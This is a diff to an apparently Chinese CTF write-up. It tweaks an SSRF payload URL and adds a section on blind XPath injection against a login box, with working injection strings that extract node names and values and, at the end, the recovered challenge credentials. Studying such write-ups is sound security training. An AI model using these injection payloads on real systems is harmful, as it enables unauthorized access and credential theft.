@@ -74,7 +74,7 @@ int(6)
 在特定情况下也可以使用如下payload:
 
 ```
-http://35.185.178.212//?_=a
+http://35.185.178.212///?_=a
 ```
 
 测试如下:
@@ -196,6 +196,55 @@ initdb($conn);
 > mysql -h 127.0.0.1 -u ssrf_user 
 
 ssrf操作: 利用gopher协议查询数据库。
+
+### Access  Box
+
+要点：xpath注入。
+
+参考文章：https://www.cnblogs.com/bmjoker/p/8861927.html
+
+1. 提取父节点名字
+
+   ```
+   'or substring(name(parent::*[position()=1]),1,1)='a
+   ```
+
+    结果如下：
+
+   ![](/assets/isictf/TIM截图20180804151333.png)
+
+   可以发现第一个字母为`u`。最终，可以得到父节点名字为`user`。
+
+2. 探测子节点
+
+   探测第一个user节点下第二个字段的名字。
+
+   ```
+   'or substring(name(//user[1]/*[2]),1,1)='u' or 'a'='a
+   ```
+
+   ![](/assets/isictf/TIM截图20180804153803.png)
+
+3. 探测子节点的值
+
+   探测第一个user节点下第1个字段的值
+
+   ```
+   'or substring(//user[1]/*[2],1,1)='u' or 'a'='a
+   或者:
+   'or substring(//user[1]/*[1]/text(),1,1)='F&password=1
+   ```
+
+   结果:
+
+   ![](/assets/isictf/TIM截图20180804153002.png)
+
+   最终得到账号：
+
+   ```
+   Adm1n
+   Ez_t0_gu3ss_PaSSw0rd
+   ```
 
 ## pwn
 
